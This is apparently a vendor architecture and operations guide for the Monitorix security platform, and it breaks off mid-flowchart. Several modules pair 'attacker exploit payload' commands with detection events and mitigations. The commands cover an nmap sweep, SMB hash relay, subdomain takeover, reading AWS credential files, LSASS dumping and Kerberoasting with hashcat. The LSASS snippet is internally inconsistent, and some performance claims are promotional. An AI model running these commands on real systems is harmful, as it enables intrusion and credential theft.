# Monitorix Enterprise Master Architecture & Operations Guide
**Level 4: Sovereign Enterprise Engineering & Operational Depth**
> Authoritative single-source reference manual for Zero-Knowledge Executives, Principal Architects, SOC Analysts, and Regulatory Compliance Auditors.
## Table of Contents
1. [Zero-Knowledge Translation Layer (Human Body Analogy)](#1-zero-knowledge-translation-layer)
2. [Cybersecurity Jargon Buster (13 Concepts)](#2-cybersecurity-jargon-buster)
3. [A Day in the Life of a Cyber Attack (6 Acts)](#3-a-day-in-the-life-of-a-cyber-attack)
4. [PDF View vs. Interactive Web Documentation View](#4-pdf-view-vs-interactive-web-documentation-view)
5. [The 13 SideMenu Modules Deep Dive](#5-the-13-sidemenu-modules-deep-dive)
6. [MITRE ATT&CK Enterprise Matrix (v14/v15)](#6-mitre-attck-enterprise-matrix)
7. [5 Field Production Incident Response Runbooks (SOPs)](#7-field-production-incident-response-runbooks)
8. [PostgreSQL & ClickHouse Authoritative Data Dictionaries](#8-database-data-dictionaries)
9. [Production REST & gRPC API Reference](#9-production-rest--grpc-api-reference)
10. [Production CRUD Operations & Subscription Plan Management](#10-production-crud-operations--subscription-plan-management)
11. [Ring 0 to Ring 3 Kernel Driver Internals](#11-ring-0-to-ring-3-kernel-driver-internals)
12. [Master Multi-Tier & Domain Architectures](#12-master-architectures)
13. [Business ROI, Data Integrity & Acceptance Accreditation](#13-business-roi-data-integrity--acceptance-accreditation)
14. [Sovereign Geospatial Architecture & React Leaflet Stack](#14-sovereign-geospatial-architecture--react-leaflet-stack)
15. [100% Real-Time Dynamic Telemetry & Zero Mock Data Guarantee](#15-100-real-time-dynamic-telemetry--zero-mock-data-guarantee)
16. [Global Compliance Center & 32 Statutory Regulatory Frameworks](#16-global-compliance-center--32-statutory-regulatory-frameworks)
17. [Sovereign Country-Based Localization & Multi-Language Architecture](#17-sovereign-country-based-localization--multi-language-architecture)

---
## 1. Zero-Knowledge Translation Layer
### The Human Body Master Analogy
* **The Brain (Autonomous AI Copilot & SOAR)**: Coordinates all defenses and initiates rapid containment without panicking.
* **The Nerves (Kernel Probes & eBPF)**: Real-time sensory network monitoring every process spawn, file modification, and socket connection.
* **The Bloodstream (Apache Kafka Streaming)**: Circulates millions of telemetry events every second across the entire body with zero message loss.
* **The Skin & Mucus (Domain Protection & EASM)**: Guards the outer perimeter, scanning all 65,535 external ports, DNS aliases, and SSL certificates.
* **The White Blood Cells (Autonomous Quarantine)**: Swarms compromised endpoints, killing malicious processes and isolating network interfaces in < 300 ms.
* **The Antibodies (Threat Intelligence & YARA)**: Remembers previous hacker campaigns globally so identical viruses are neutralized instantly.

---
## 2. Cybersecurity Jargon Buster
| Technical Term | Full Name | Everyday Analogy Definition |
| :--- | :--- | :--- |
| **IP Address** | Internet Protocol Address | A computer's digital home address so internet mail and data know where to go. |
| **Port** | TCP/UDP Network Port | Numbered doors on a building (1 to 65,535). Port 80/443 is the front door; Port 22/3389 is the back server door. |
| **Domain Name** | Fully Qualified Domain Name (FQDN) | Your company's nameplate on the internet (e.g. monitorix.elsea.co.in) instead of remembering confusing numbers. |
| **DNS** | Domain Name System | The internet's phonebook that translates nameplates (monitorix.elsea.co.in) into computer numbers (IP addresses). |
| **CNAME** | Canonical Name Alias | A digital forwarding address pointing one domain name to another service (like an S3 bucket or GitHub page). |
| **Subdomain Takeover** | Orphaned CNAME Exploitation | Like moving out of an apartment but forgetting to cancel mail forwarding, allowing a stranger to move in and read your mail. |
| **Ransomware** | Cryptoviral Extortion Malware | Digital kidnappers who sneak into a computer, lock all your files with an unbreakable password, and demand millions to unlock them. |
| **mTLS 1.3** | Mutual Transport Layer Security | Both the computer and the server show digital government passports to each other before talking, so nobody can eavesdrop. |
| **Zero Trust** | Continuous Verification Model | 'Never trust, always verify.' Even if you work at the company and are sitting at your desk, the system checks your ID every time. |
| **EDR / XDR** | Extended Detection & Response | A digital police force and surveillance camera network watching every computer, server, and network cable 24/7. |
| **SOAR** | Security Orchestration & Response | An automated fire sprinkler system that immediately sprays water and locks fire doors in 0.24 seconds when smoke is detected. |
| **SIEM** | Security Information & Event Mgmt | A digital warehouse that collects millions of security logs every second and searches for suspicious patterns. |
| **CVE** | Common Vulnerabilities & Exposures | The global catalog of known bugs and unlocked doors in software that hackers try to break through. |

---
## 3. A Day in the Life of a Cyber Attack
A step-by-step narrative of an enterprise breach attempt neutralized in 240 milliseconds:
1. **Act 1: The Scout (3:12 AM)**: An overseas adversary scans the company perimeter for open ports. Monitorix EASM tags the source IP and prepares edge rate limits.
2. **Act 2: The Trap (3:45 AM)**: An employee clicks an infected invoice email containing a hidden macro payload.
3. **Act 3: The Spark (3:46:02 AM)**: The malware executes in memory without writing files to disk to evade signature-based antivirus.
4. **Act 4: The Sentinel (3:46:08 AM)**: Monitorix kernel driver intercepts memory injection into LSASS and generates a P1 security event.
5. **Act 5: The Shield (3:46:22 AM)**: SOAR playbook kills the process and isolates the host in 140 ms, stopping lateral movement.
6. **Act 6: Morning Peace of Mind (8:30 AM)**: The CISO receives a 1-page executive summary: Zero files encrypted, $1.85M in ransom saved.

---
## 4. PDF View vs. Interactive Web Documentation View
### Architecture Guidance: Which Format is Better?
* **Interactive Web Documentation (Recommended for Operations & Engineering)**:
  - Supports instant full-screen lightbox image zoom on all architecture diagrams.
  - 1-click smooth navigation to any of the 13 modules, runbooks, or API endpoints.
  - Copyable cURL commands, Python scripts, and JSON payloads.
  - Switchable Light Mode (Daylight) and Dark Mode (Night).
  - Always updated in real-time.
* **PDF Document View (Recommended for Board Presentations & Compliance Filings)**:
  - Formal immutable record for executive board meetings.
  - Required for ISO 27001, SOC 2 Type II, and regulatory compliance evidence.
  - Fully supported via the 1-click **'Save as PDF / Print'** button on the web documentation page.

---
## 5. The 13 SideMenu Modules Deep Dive

### 01. COMMAND CENTER (SOC Mission Control & Telemetry)
**Description**: Real-time executive situational awareness and operational mission control center for SOC directors and Tier 1–3 security analysts. Unifies real-time 3D attack vector mapping, live analyst triage queues, Kafka consumer lag meters, and fleet-wide remote control planes.

**Architectural Blueprint**: [`command_center_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/command_center_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of NASA Mission Control in Houston during a space launch. Rows of flight controllers look at giant screens showing telemetry from every engine part. The Command Center is the security control room for your entire company, showing live attacks across the globe, system vital signs, and instant emergency controls.

> **Real-World Business Horror Story**: A multinational firm was hit by hackers. Because each office used separate disconnected antivirus software, nobody realized that 50 computers in London, Tokyo, and New York were simultaneously infected. By the time leadership figured it out 3 weeks later, all backups were deleted, resulting in $12 million in ransom costs.

> **Step-by-Step Attack Walkthrough**: A phishing email tricks a marketing manager in London into downloading an infected invoice. In 12 milliseconds, the agent detects the virus and sends an alert. The Command Center in New York flashes a DEFCON 2 alarm, highlights the London laptop on the 3D globe, and prompts the analyst with a 1-click button: 'Isolate Host'. The analyst clicks it, severing the laptop's network before the virus can reach the main database.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts lateral movement across internal subnet
$nmap_scan = "nmap -sS -p 445,3389,8010 192.168.1.0/24 -T4"
# Attacker fires SMB relay exploit against detected host
Invoke-TheHash -Type SMBClient -Target 192.168.1.45 -Username Administrator -Hash 31d6cfe0d16ae931b73c59d7e0c089c0
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "evt-7701-992a",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "timestamp": "2026-10-28T08:14:02.124Z",
  "agent_id": "ag-win-london-045",
  "event_type": "SECURITY_ALERT",
  "severity": "CRITICAL",
  "threat_name": "MITRE.T1557.001_SMB_RELAY_ATTEMPT",
  "details": {
    "source_ip": "192.168.1.99",
    "target_ip": "192.168.1.45",
    "port": 445,
    "process": "System",
    "auth_protocol": "NTLMv2_ANONYMOUS_RELAY"
  }
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous SOAR Host Isolation Payload
POST /api/v1/forensics/hosts/ag-win-london-045/isolate
{
  "reason": "Automated containment for SMB Relay lateral movement",
  "block_network": true,
  "allow_monitorix_telemetry": true,
  "execution_speed_ms": 180
}
```
#### Architectural Flowchart
```
┌─────────────────┐       ┌─────────────────┐       ┌─────────────────┐
│ Endpoint Fleet  │──────►│ FastAPI Gateway │──────►│  Kafka Topic    │
│ (Win/Linux/Mac) │ mTLS  │  (Port 8010)    │       │ (telemetry.raw) │
└─────────────────┘       └────────┬────────┘       └────────┬────────┘
                                   │ Rate Limit              │ Manual Commit
                                   ▼                         ▼
                          ┌─────────────────┐       ┌─────────────────┐
                          │   Redis Cache   │       │ Stream Workers  │
                          │ (5,000 RPM/Org) │       │ (< 250 µs/event)│
                          └─────────────────┘       └────────┬────────┘
                                                             │
                                ┌────────────────────────────┴───────────────────────────┐
                                ▼                                                        ▼
                     ┌─────────────────────┐                                  ┌─────────────────────┐
                     │ PostgreSQL (ACID)   │                                  │ ClickHouse (Column) │
                     │ Incidents & Alerts  │                                  │ Sub-150ms Aggregate │
                     └──────────┬──────────┘                                  └──────────┬──────────┘
                                │                                                        │
                                └────────────────────────────┬───────────────────────────┘
                                                             ▼
                                                    ┌─────────────────┐
                                                    │ Socket.IO Server│
                                                    │ Room Broadcast  │
                                                    └────────┬────────┘
                                                             ▼
                                                    ┌─────────────────┐
                                                    │ SOC Command Web │
                                                    │ 3D Map & Queue  │
                                                    └─────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Telemetry & Alert Stream Inception**: Fleet agents (Windows, Linux, macOS) capture process mutations, socket connections, and file hashes, emitting micro-batches via authenticated mTLS 1.3 to Ingestion Gateway port 8010.
02. **Ingress Verification & Partitioning**: FastAPI ingress nodes validate tenant JWT tokens, check Redis rate limits (5,000 RPM/tenant), and push payloads into Kafka topic 'monitorix.telemetry.raw' partitioned by TenantId.
03. **Queue Auditing & Dead Letter Tracking**: Real-time Kafka consumer lag meters monitor partition offsets; malformed or unparseable payloads are diverted to the Dead Letter Queue (DLQ) with zero event dropping.
04. **ClickHouse Sub-Millisecond Aggregation**: Columnar correlation workers aggregate fleet health, active incidents, and IOC matches, recalculating global DEFCON threat levels (1–5) in < 150 ms.
05. **WebSocket Room Broadcast**: FastAPI Socket.IO server pushes geo-located attack coordinates and triage updates to active analyst socket rooms ('threat_map_stream', 'soc_queue_stream').
06. **Sovereign Geospatial & Queue Rendering**: SOC frontend visualizes attack trajectories using React Leaflet 5.0 with sovereign basemaps (Esri Streets, Dark Gray, Light Gray, OSM) and populates the Analyst Work Queue (/soc/queue) with severity sorting.
07. **Analyst Triage & Fleet Action**: Analyst acknowledges incident, inspects agent hardware posture (/agents), and triggers immediate remote remediation or quarantine via the central control plane.

#### Subsystems, Schemas & API Endpoints
* Executive Threat Gauge: Dynamically calculates enterprise DEFCON level (1 to 5) using multi-factor risk algorithms based on active uncontained critical incidents.
* React Leaflet Sovereign Engine: React-Leaflet 5.0 and Esri vector canvas projecting real-time inbound attack vectors with geographic IP coordinates, protocol indicators, and dynamic great-circle source/dest trajectories with zero external API keys.
* Analyst Work Queue: Prioritizes incidents by severity, impact, and SLA timers; supports 1-click triage, analyst assignment, and case escalations.
* Data-Loss Observability: Real-time telemetry monitoring consumer group offsets, partition throughput, and Dead Letter Queue diverters.
* **Database Tables**: `incidents, alerts, agent_status, dlq_events, telemetry_events (ClickHouse)`
* **Key API Routes**: `/, /soc/queue, /data-loss-monitoring, /agents, /vulnerabilities`

### 02. ASSET & INFRASTRUCTURE (EASM, NDR & CNAPP)
**Description**: Complete external attack surface management (EASM), network detection and response (NDR), and cloud-native application protection platform (CNAPP). Continuously inventories public assets, detects orphaned DNS/CNAME drift, and enforces zero-trust cloud configuration.

**Architectural Blueprint**: [`easm_domain_monitoring_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/easm_domain_monitoring_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Imagine a 24/7 security guard walking around the entire outside perimeter of your company's physical building, checking all 65,535 doors, windows, and delivery gates to make sure nobody accidentally left one unlocked. In the digital world, this module continuously discovers every website, server, domain name, and cloud storage bucket your company owns and locks any open doors before burglars find them.

> **Real-World Business Horror Story**: A junior developer creates a temporary test website (e.g. test.company.com) connected to an Amazon cloud storage bucket. Six months later, the developer deletes the storage bucket but forgets to delete the domain name. A hacker notices the abandoned domain, takes it over in 2 minutes (Subdomain Takeover), puts up a fake company login page, and steals thousands of employee passwords.

> **Step-by-Step Attack Walkthrough**: A hacker runs a script scanning the internet for open database ports. They spot an exposed PostgreSQL database on port 5432 belonging to your company. Within 4 seconds, Monitorix EASM detects the scan, flags that port 5432 is exposed to the public internet, automatically executes an edge firewall rule blocking the hacker's IP address, and alerts the IT team to close the port.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker scans for dangling CNAME pointing to unclaimed S3 bucket
subfinder -d enterprise.com -silent | httpx -status-code -title
# Found: dev-assets.enterprise.com -> enterprise-assets-dev.s3.amazonaws.com (404 NoSuchBucket)
aws s3 mb s3://enterprise-assets-dev --region us-east-1
# Takeover complete: Attacker now serves arbitrary malware on legitimate corporate domain
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "easm-drift-8810",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "scan_type": "DNS_CNAME_DRIFT_AUDIT",
  "domain": "dev-assets.enterprise.com",
  "cname_target": "enterprise-assets-dev.s3.amazonaws.com",
  "status": "VULNERABLE_DANGLING_CNAME",
  "risk_score": 9.8,
  "action_required": "IMMEDIATE_DNS_RECORD_REVOCATION"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous Edge DNS Revocation via Cloudflare API
PATCH /api/v2/easm/domains/dev-assets.enterprise.com/remediate
{
  "action": "PURGE_CNAME_RECORD",
  "edge_provider": "cloudflare",
  "zone_id": "9a8b7c6d5e4f3a2b1c",
  "status": "REMEDIATED",
  "execution_latency_ms": 210
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│              EASM Discovery & Asset Ingress            │
│ (Subdomains, 65k Port Recon, TLS Certs, CNAME Audits)  │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│             CNAME Drift & Takeover Inspector           │
│  - Queries Cloudflare & AWS Route53 APIs               │
│  - Checks for NXDOMAIN & unclaimed bucket aliases      │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│              NDR Passive Packet Tap Engine             │
│   Suricata eBPF Wire-Speed Inspection (< 1.2 µs/pkt)   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           CNAPP Multi-Cloud Drift Evaluator            │
│ (AWS, Azure, GCP, Kubernetes RBAC & CIS Benchmarks)    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│      Unified Asset Graph & Autonomous Edge Shield      │
│  - Updates PostgreSQL 'domains' & 'assets' tables      │
│  - Auto-revokes dangling DNS records via Cloudflare API│
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Seed Domain & Cloud Discovery**: Recon engine accepts organization root domains (e.g., elsea.co.in) and cloud tenant credentials to seed continuous perimeter mapping.
02. **External Port & Protocol Audit**: Asynchronous network probes scan all 65,535 TCP/UDP ports against registered public IPs, mapping running web servers, database endpoints, and SSH bastions.
03. **DNS & CNAME Takeover Verification**: CNAME records are actively validated against target cloud providers (AWS S3, GitHub Pages, Heroku, Azure). Any dangling CNAME resolving to an unclaimed namespace triggers an immediate High Alert.
04. **SSL/TLS Security & Cipher Scoring**: Monitors certificate expiration dates, Revocation (CRL/OCSP) status, and SSL cipher suites, warning 30 days in advance of certificate expiry.
05. **NDR Packet Stream & Protocol Anomaly**: Network sensors tap mirrored switch traffic, analyzing NetFlow and deep packet headers for unencrypted credentials, lateral RPC, or anomalous SSH egress.
06. **CNAPP Container & K8s Posture Scan**: Inspects Kubernetes clusters and container registries for CIS benchmark compliance, exposed Kubernetes API servers, and privileged pods.
07. **Autonomous Edge Revocation & Hardening**: If an asset drifts into dangerous exposure, Monitorix calls Cloudflare or cloud APIs to null-route the dangling domain or isolate the security group within seconds.

#### Subsystems, Schemas & API Endpoints
* EASM Reconnaissance Engine: Automated passive and active discovery of public IPs, certificates, domains, and SaaS assets.
* CNAME Drift Inspector: Protects against subdomain hijacking by validating target namespace ownership across 40+ cloud vendors.
* NDR Traffic Analyzer: Low-latency NetFlow/IPFIX collector decoding L7 application protocols (HTTP/2, DNS, TLS 1.3, Kerberos).
* CNAPP Cloud Posture Monitor: Real-time drift detection for AWS IAM, Azure RBAC, GCP Service Accounts, and Kubernetes workloads.
* **Database Tables**: `domains, cname_records, assets, cloud_accounts, network_flows (ClickHouse)`
* **Key API Routes**: `/assets, /easm/inventory, /easm/cname-monitoring, /ndr/live-stream, /cnapp/posture`

### 03. THREAT INTELLIGENCE (Feeds, Sandbox & Deception)
**Description**: Autonomous cyber threat intelligence aggregator, QEMU-based malware sandbox, dynamic YARA compilation engine, and honey-token deception framework.

**Architectural Blueprint**: [`threat_intelligence_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/threat_intelligence_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of a top-secret international police intelligence agency that collects mugshots, fingerprints, and getaway vehicle descriptions from banks robbed all over the world. This module receives live threat reports from 50 global security feeds, tests suspicious files inside a virtual bomb shelter (sandbox), and plants digital booby traps (honeypots) to trick hackers into giving away their position.

> **Real-World Business Horror Story**: A company received an email with a Word document called 'Q4_Bonuses.docx'. An executive opened it. Because their security had no threat intelligence feeds, they didn't know that this exact file hash was flagged 2 hours earlier in Germany as a Russian state-sponsored cyber weapon. The entire corporate network was wiped clean.

> **Step-by-Step Attack Walkthrough**: A hacker breaches an internal server and looks for passwords. They discover a tempting file on the desktop named 'AWS_Master_Keys.txt'. The moment the hacker opens that file, a silent alarm sounds! The file was a Monitorix Canary Booby Trap. The hacker's IP address, MAC address, and workstation name are instantly recorded, and their access is frozen.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts to read canary honey-token from developer folder
cat /home/developer/.aws/credentials
# Attacker uses decoy access key to authenticate to AWS
aws sts get-caller-identity --access-key-id AKIAHONEYTRIPWIRE001 --secret-access-key decoysecretkey123
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "tripwire-canary-4412",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "alert_type": "DECEPTION_HONEYTOKEN_TRIGGERED",
  "canary_id": "canary-aws-prod-decoy-01",
  "compromised_host": "linux-dev-srv-02",
  "process": "aws",
  "pid": 28491,
  "action_taken": "IMMEDIATE_SESSION_TERMINATION",
  "confidence_score": 100.0
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous Honey-token Trap Response
POST /api/v2/threat_intel/deception/trigger
{
  "canary_id": "canary-aws-prod-decoy-01",
  "host_id": "linux-dev-srv-02",
  "action": "REVOKE_CREDENTIAL_AND_FREEZE_PROCESS",
  "time_elapsed_ms": 85
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│        Global Threat Ingress (STIX 2.1 / TAXII 2.1)    │
│  (50+ Commercial & Open-Source Threat Intelligence)    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│        Deduplication, Scoring & Hash Normalizer        │
│    SHA-256, MD5, SSDEEP, C2 IP & Domain Correlation    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Automated QEMU / KVM Detonation Sandbox        │
│   - Headless Windows 11 & Ubuntu 24.04 Environments    │
│   - Intercepts API hooking, code caves, registry edits │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│            YARA Rule Compiler & Fleet Push             │
│   Compiles custom signatures and broadcasts to agents  │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Canary Deception & Honeypot Tripwires          │
│   Fake AWS keys, decoy files, fake Active Directory OU │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Threat Feed Ingestion**: Subscribes to STIX 2.1 and TAXII feeds, pulling 500,000+ new Indicators of Compromise (IOCs) daily into memory.
02. **Indicator Deduplication & Confidence Scoring**: Calculates composite threat scores (0–100) based on feed reputation, age, and observed false-positive rates.
03. **Dynamic Sandbox Detonation**: Suspicious binaries or email attachments uploaded by agents are automatically launched inside isolated QEMU virtual machines with kernel API tracing.
04. **Behavioral MITRE Tagging**: Sandbox monitors process behavior (e.g., process hollowing, registry run key edits, credential dumping) and tags MITRE ATT&CK techniques.
05. **Automated YARA Rule Generation**: Extracts unique byte sequences and behavioral patterns, compiling production-grade YARA rules with automated syntax validation.
06. **Real-Time Fleet Rule Synchronization**: Broadband gRPC stream pushes compiled YARA rules to all Windows, Linux, and macOS endpoint agents within 2.5 seconds.
07. **Canary Deployment & Decoy Monitoring**: Deploys fake decoy credentials (honey-tokens) into memory and file systems. Any access to a honey-token triggers an immediate P1 alert with zero false positives.

#### Subsystems, Schemas & API Endpoints
* STIX 2.1 Feed Processor: High-throughput ingestion engine parsing IP, domain, hash, and CVE indicators.
* QEMU Behavioral Sandbox: Fully automated detonation chamber logging system calls, network sockets, and file mutations.
* YARA Fleet Compiler: In-memory compiler distributing binary pattern matchers to endpoint agents.
* Deception Honey-Token Engine: Generates believable AWS keys, database connection strings, and Active Directory decoy accounts.
* **Database Tables**: `threat_feeds, indicators, sandbox_reports, yara_rules, canary_tokens`
* **Key API Routes**: `/threat-intelligence, /threat-intel/sandbox, /threat-intel/yara, /threat-intel/canary, /threat-intel/feeds`

### 04. SECURITY & FORENSICS (EDR, Live Shell & Evidence Vault)
**Description**: Enterprise digital forensics and incident response (DFIR). Features cryptographically audited remote terminal shell, process execution lineage trees, phishing email analyzer, and WORM-compliant evidence vault.

**Architectural Blueprint**: [`security_forensics_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/security_forensics_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of a team of CSI crime scene investigators equipped with time-travel goggles and an unbreakable safe. When a crime happens on any company computer, this module allows investigators to open an encrypted remote terminal (Live Shell), rewind time to see exactly which program spawned another program, analyze malicious emails, and store legal evidence in a tamper-proof digital vault that can be presented in court.

> **Real-World Business Horror Story**: A company suffered a massive data breach. They hired forensic investigators who discovered that the IT team had rebooted the servers and wiped the logs to 'fix the problem'. Because there was no tamper-proof evidence vault, the company could not prove which data was stolen, leading to a maximum GDPR fine of $22 million.

> **Step-by-Step Attack Walkthrough**: A rogue insider plugs a USB drive into a financial server and runs a script to copy bank account numbers. Monitorix Live Forensics detects the USB insertion, records the exact command line executed, freezes the insider's terminal, and locks the forensic RAM snapshot into the SHA-256 Tamper-Proof Evidence Vault before the insider can pull the USB stick out.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts process injection and LSASS memory dump
$proc = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
# Injecting shellcode into notepad PID
[MemoryDumper]::DumpProcessMemory($proc.Id, "C:\Users\Public\lsass_dump.dmp")
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "dfir-lsass-9901",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "alert_type": "PROCESS_INJECTION_LSASS_ACCESS",
  "source_process": "powershell.exe",
  "source_pid": 5512,
  "target_process": "lsass.exe",
  "target_pid": 680,
  "access_mask": "0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)",
  "mitigation": "TERMINATED_PROCESS_AND_CAPTURED_MEMORY_DUMP"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous Remote Forensic Lockdown
POST /api/v1/forensics/live-shell/execute
{
  "host_id": "ag-win-finance-02",
  "command": "taskkill /F /PID 5512 && Fltmc unload MaliciousFilter",
  "record_session": true,
  "sha256_evidence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           Endpoint Fleet Forensic Probes               │
│   Windows ETW / Linux eBPF / macOS Endpoint Security   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│        Encrypted Remote Live Shell (WebSockets)        │
│   mTLS 1.3, Per-Keystroke Audit, Nonce-Signed Protocol │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│          Process Execution Lineage Graph Engine        │
│  Resolves PID -> Parent PID -> Great-Grandparent PID   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│             Email (.eml) Forensic Analyzer             │
│   SPF/DKIM/DMARC, Header Hop Analysis, QR Code OCR     │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│        WORM Evidence Vault & Cryptographic Ledger      │
│  MinIO Object Lock, SHA-256 Hash Chain, Court-Admissible│
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Forensic Trigger & Memory Dump**: Agent detects anomalous execution (e.g. LSASS access, process injection) and takes a volatile RAM snapshot of the target process.
02. **Encrypted Live Shell Session Initiation**: SOC analyst opens a Web-based Live Shell session connecting to the remote host over an authenticated, encrypted WebSocket channel.
03. **Keystroke Auditing & Dual-Custody**: Every command typed by the analyst is logged to an immutable append-only audit trail with cryptographic timestamps to prevent operator misuse.
04. **Process Lineage Tree Construction**: Queries ClickHouse to reconstruct the complete ancestry tree: Word -> cmd.exe -> powershell.exe -> certutil.exe -> beacon.exe.
05. **Email Forensics & Header Hop Trace**: Analyst drags-and-drops suspicious .eml files; the analyzer verifies DKIM signatures, SPF alignments, and extracts weaponized URLs or QR codes.
06. **Artifact Hashing & WORM Storage**: Captured memory dumps, PCAP files, and disk blocks are hashed with SHA-256 and uploaded to MinIO object storage with Object Lock enabled (Write Once, Read Many).
07. **Chain of Custody Legal Export**: Generates an evidentiary PDF with verifiable cryptographic signatures, timestamps, and operator attestations ready for judicial court proceedings.

#### Subsystems, Schemas & API Endpoints
* Encrypted Live Terminal: Low-latency web shell with granular RBAC, session recording, and read-only execution modes.
* Process Lineage Visualizer: Interactive D3.js graphical tree displaying process spawning relationships, sockets, and file writes.
* Phishing Mail Analyzer: Deep parsing of .eml and .msg files, evaluating DMARC/SPF/DKIM and decoding obfuscated QR codes.
* Cryptographic Evidence Vault: MinIO WORM storage ensuring complete chain-of-custody compliance (NIST SP 800-86).
* **Database Tables**: `forensic_sessions, process_lineages, evidence_vault, email_analyses, command_history`
* **Key API Routes**: `/forensics, /forensics/live-shell, /forensics/lineage, /forensics/email-analyzer, /forensics/evidence-vault`

### 05. IDENTITY & ZERO TRUST (ITDR, Impossible Travel & Device Trust)
**Description**: Identity Threat Detection & Response (ITDR) and Zero Trust Architecture (ZTA). Enforces Continuous Adaptive Risk and Trust Assessment (CARTA), Active Directory attack defense, and device health verification.

**Architectural Blueprint**: [`identity_zero_trust_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/identity_zero_trust_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of the security system at an airport boarding gate. Even if someone shows a valid ticket with your name on it, if that person just checked in at Tokyo 10 minutes ago and is now trying to board a plane in New York, the gate alarm sounds because physical teleportation is impossible. This module verifies user identity, blocks impossible travel, and ensures only healthy, trusted company laptops can access sensitive files.

> **Real-World Business Horror Story**: A hacker purchased the username and password of a senior IT director on the dark web. The hacker logged in from Russia at 2:00 AM. Because the company's security didn't check for 'Impossible Travel' or device health, the hacker downloaded the entire customer database in 15 minutes without raising a single alarm.

> **Step-by-Step Attack Walkthrough**: An employee logs into their email from their office in Mumbai. Exactly 14 minutes later, someone attempts to log into the same account using valid credentials from Frankfurt, Germany. Monitorix ITDR calculates that traveling 6,700 km in 14 minutes requires flying at 28,000 km/h. Monitorix instantly invalidates the session, triggers an MFA challenge, and isolates the Frankfurt connection.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts Kerberoasting against Domain Controller
python3 GetUserSPNs.py enterprise.local/lowprivuser:Password123 -dc-ip 10.0.0.5 -request
# Hashcat cracking script on captured TGS ticket
hashcat -m 13100 -a 0 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "itdr-kerb-3312",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "event_type": "KERBEROASTING_ATTEMPT_DETECTED",
  "username": "lowprivuser",
  "source_ip": "10.0.1.88",
  "target_spn": "MSSQLSvc/sqlprod01.enterprise.local:1433",
  "ticket_encryption": "RC4_HMAC_MD5 (VULNERABLE)",
  "mitigation": "ACCOUNT_LOCKED_AND_SPN_ROTATED"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous ITDR Account Lock & Session Revocation
POST /api/v2/itdr/accounts/lowprivuser/remediate
{
  "action": "REVOKE_SESSIONS_AND_FORCE_PASSWORD_RESET",
  "domain_controller": "dc01.enterprise.local",
  "kill_active_kerberos_tickets": true,
  "latency_ms": 145
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           Identity Ingress & Authentication            │
│  (Okta, Azure AD / Entra ID, Ping, Active Directory)   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
